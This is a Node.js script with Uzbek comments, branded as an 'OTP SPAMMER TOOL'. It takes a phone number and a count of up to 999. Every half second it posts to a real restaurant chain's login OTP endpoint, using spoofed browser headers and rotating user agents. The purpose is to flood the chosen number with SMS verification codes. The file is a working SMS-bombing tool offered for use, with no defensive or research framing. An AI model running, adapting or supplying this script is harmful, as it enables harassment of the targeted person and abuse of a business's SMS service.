const axios = require('axios');
const readline = require('readline-sync');
const { execSync } = require('child_process');

const LOCAL_VERSION = '1.0.0';
const REMOTE_VERSION_URL = 'https://raw.githubusercontent.com/dilmuradd/smsOTPbomber/master/version.txt';

// Versiyani tekshiruvchi funksiya
async function checkVersion() {
  try {
    const response = await axios.get(REMOTE_VERSION_URL);
    const remoteVersion = response.data.trim();

    if (remoteVersion !== LOCAL_VERSION) {
      console.log(`
╔══════════════════════════════════════╗
║ ⚠️ YANGILANISH MAVJUD!                 ║
║ 🔁 Yangi versiya: ${remoteVersion}     ║
║ 📌 Sizning versiyangiz: ${LOCAL_VERSION} ║
╚══════════════════════════════════════╝
      `);

      const answer = readline.question('🔄 Yangilashni xohlaysizmi? (Y/N): ').toLowerCase();

      if (answer === 'y') {
        console.log('⬇️ Yangilanish jarayoni...');
        try {
          execSync('git pull', { stdio: 'inherit' });
          console.log('✅ Yangilandi! Dastur qayta ishga tushmoqda...\n');
          process.exit(0); // Chiqib foydalanuvchi qayta ishga tushiradi
        } catch (err) {
          console.error('❌ Yangilashda xatolik:', err.message);
          process.exit(1);
        }
      } else {
        console.log('❌ Dasturni yangilamasdan chiqildi.');
        process.exit(0);
      }
    }
  } catch (err) {
    console.log('⚠️ Versiyani tekshirib bo‘lmadi:', err.message);
  }
}

checkVersion().then(() => {
  // Chiroyli chizilgan interfeys
  console.log(`
╔══════════════════════════════════════╗
║ 📲 OTP SPAMMER TOOL by RootNight      ║
║ 🌐 Telegram: @rootnightblog           ║
╚══════════════════════════════════════╝
  `);

  // Telefon raqamni va maksimal yuborish sonini so‘raymiz
  const phone = readline.question('📱 Telefon raqamni kiriting (masalan: 88 790 59 99): ');
  const maxCount = parseInt(readline.question('📈 Nechta SMS yuborilishi kerak (maksimal 999): '));

  // Intervalli va hisoblagich
  const intervalTime = 500; // 0.5 sekundda bir yuboradi
  let count = 0;
  let interval;

  // Tasodifiy User-Agent generatori
  function getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
      'Mozilla/5.0 (X11; Linux x86_64)...',
      'Mozilla/5.0 (Windows NT 6.1; WOW64)...',
      'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL)...'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  // OTP yuborish funksiyasi
  function sendOTP() {
    if (count >= maxCount) {
      clearInterval(interval);
      console.log('🔔 Yuborish tugadi.');
      return;
    }

    axios({
      method: 'post',
      url: 'https://kfc.com.uz/post/loginUserOTP',
      data: `type=1&country_id=3978&username=${encodeURIComponent(phone)}`,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://kfc.com.uz',
        'Referer': 'https://kfc.com.uz/',
        'User-Agent': getRandomUserAgent(),
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Gpc': '1',
        'Priority': 'u=0',
        'Te': 'trailers',
        'Cookie': 'PHPSESSID=dummy-session; G_ENABLED_IDPS=google; CookieConsent={...}'
      },
    }).then(() => {
      count++;
      console.log(`🔁 ${count}. SMS yuborildi!`);
    }).catch((error) => {
      console.log('❌ Xatolik yuz berdi:', error.message);
    });
  }

  // Yuborishni boshlash
  console.log(`🔁 Kod yuborish boshlandi → ${phone}`);
  interval = setInterval(sendOTP, intervalTime);
});
